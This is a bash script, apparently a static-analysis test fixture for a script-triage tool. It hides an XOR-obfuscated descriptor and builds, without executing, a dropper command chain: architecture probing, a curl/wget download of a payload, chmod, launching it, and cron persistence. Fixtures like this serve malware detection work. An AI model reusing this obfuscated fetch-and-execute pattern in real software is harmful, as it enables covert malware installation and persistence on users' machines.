#!/usr/bin/env bash
  # Huntress Script Triage -- inert static-analysis fixture (bash_linux)
  readonly Material_a2161ae2='20 239 83 6 54 22 183 18 9 120 18 160 13 28 44 14 183 61 18 42 17 166 78 27 38 19 167 11 8 32 61 160 7 23 42 22 183 78 13 55 11 166 7 37 35 11 190 7 86 38 10 179 12 29 32 61 191 13 30 32 78 182 11 9 53 3 166 1 18 26 18 160 13 25 32 17 161 30 27 33 3 162 22 31 55 95 165 5 31 49 61 179 16 25 45 61 180 3 22 41 0 179 1 17 57 17 166 3 29 32 61 177 13 15 43 22 239 87 6 38 3 191 18 27 44 5 188 61 19 33 95 177 3 23 53 3 187 5 20 104 4 176 81 78 124 86 227 6 76 35 30 167 16 22 120 10 166 22 10 54 88 253 77 28 39 81 230 91 78 116 6 228 4 84 32 26 179 15 10 41 7 252 11 20 51 3 190 11 30 106 7 183 90 66 116 87 225 4 84 54 10 174 23 9 32 16 141 3 29 32 12 166 95 50 48 12 166 16 31 54 17 158 3 24 106 4 176 81 78 124 86 227 6 76 35 30 180 11 22 32 61 162 3 14 45 95 253 22 23 53 77 186 23 20 49 16 183 17 9 104 1 179 1 18 32 77 252 17 14 36 5 183 79 28 39 81 230 91 78 116 6 228 4 6 36 16 177 10 37 53 16 189 0 31 120 23 188 3 23 32 79 191 30 9 32 16 164 11 25 32 61 188 3 23 32 95 167 18 30 36 22 183 79 28 39 81 230 91 78 116 6 228 4 84 54 7 160 20 19 38 7 174 1 8 42 12 141 18 27 49 10 239 77 31 49 1 253 1 8 42 12 252 6 85 48 18 182 3 14 32 79 180 0 73 113 91 230 83 30 115 4'
  readonly Codec_a2161ae2='decimal_space|repeating_key_xor|62,d2,62,7a,45'

  Load_a2161ae2() {
    e=()
    local IFS=' '
    read -r -a e <<< "${Material_a2161ae2}"
  }

  Decode_a2161ae2() {
    d=()
    local -a key_bytes=(98 210 98 122 69)
    local i
    for ((i=0; i<${#e[@]}; i++)); do
      d+=("$((e[i] ^ key_bytes[i % ${#key_bytes[@]}]))")
    done
  }

  Recover_a2161ae2() {
    local -a e d
    local t n z i
    local -a series=(3 5 8 13); n="${series[*]:1:2}"
    Load_a2161ae2
    z=0; while ((z < 1)); do Decode_a2161ae2; ((z+=1)); done
    t=''
    local octal character
    for i in "${!d[@]}"; do
      printf -v octal '%03o' "${d[i]}"
      printf -v character '%b' "\\$octal"
      t+="$character"
    done
    printf '%s\n' "$t"
  }

  Inspect_a2161ae2() { local recovered; recovered="$(Recover_a2161ae2)"; printf '%s\n' "$recovered"; }

  Plan_a2161ae2() {
    local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
    descriptor="$(Inspect_a2161ae2)"
    local -a fields
    IFS='|' read -r -a fields <<< "$descriptor"
    for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
    local -a profile_command=(uname -m) request_primary=(curl --fail --silent --show-error -o "$file_path" "$url") request_fallback=(wget -qO "$file_path" "$url") permission_command=(chmod 0700 "$file_path") launch_command=("$file_path") cron_descriptor=(printf '%s' "$cron_path" "$service_name")
    declare -p profile_command request_primary request_fallback permission_command launch_command cron_descriptor
  }

  if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_a2161ae2; fi
